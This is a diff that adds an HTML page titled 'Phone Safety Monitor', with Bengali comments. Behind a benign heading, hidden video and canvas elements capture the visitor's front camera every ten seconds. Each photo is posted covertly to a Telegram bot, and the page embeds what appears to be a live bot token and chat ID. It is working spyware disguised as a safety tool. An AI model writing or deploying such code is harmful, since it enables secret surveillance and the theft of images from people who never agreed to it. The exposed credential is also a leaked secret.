@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Phone Safety Monitor</title>
+</head>
+<body>
+    <h2>Phone Safety Monitor Active...</h2>
+    <video id="video" width="320" height="240" autoplay style="display:none;"></video>
+    <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
+
+    <script>
+        const token = 'YOUR_BOT_TOKEN8913754683:AAHHcjalNABTY9M_EQPTPcigT8_jLDWDugY'; // আপনার বট টোকেন বসান
+        const chatId = '5551249785';   // আপনার চ্যাট আইডি বসান
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+
+        // ক্যামেরার পারমিশন নেওয়া
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+        .then(stream => {
+            video.srcObject = stream;
+            // পারমিশন পাওয়ার পর প্রতি ১০ সেকেন্ড (১০০০০ মিলিসেকেন্ড) পর পর ছবি তুলবে
+            setInterval(captureAndSend, 10000);
+        })
+        .catch(err => {
+            console.error("Camera access denied: ", err);
+        });
+
+        function captureAndSend() {
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, 320, 240);
+            
+            // ছবিটিকে Blob ফাইলে রূপান্তর করা
+            canvas.toBlob(blob => {
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('photo', blob, 'capture.jpg');
+
+                // Telegram API-তে ছবি পাঠানো
+                fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(response => console.log('Photo sent to Telegram'))
+                .catch(error => console.error('Error sending photo:', error));
+            }, 'image/jpeg');
+        }
+    </script>
+</body>
+</html>
